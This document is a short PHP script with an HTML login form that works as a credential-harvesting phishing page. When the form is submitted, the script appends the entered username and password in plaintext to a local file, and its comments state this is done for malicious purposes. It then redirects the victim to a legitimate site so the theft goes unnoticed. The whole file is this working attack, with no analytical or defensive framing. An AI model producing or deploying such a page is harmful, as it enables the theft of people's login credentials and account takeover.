<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the captured credentials to a file or database for malicious purposes
    $logFile = fopen("captured_credentials.txt", "a");
    fwrite($logFile, "Username: " . $username . " | Password: " . $password . "\n");
    fclose($logFile);

    // Redirect the user to a legitimate website after capturing their credentials
    header("Location: https://example.com");
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <form method="POST" action="">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>

        <input type="submit" value="Login">
    </form>
</body>
</html>
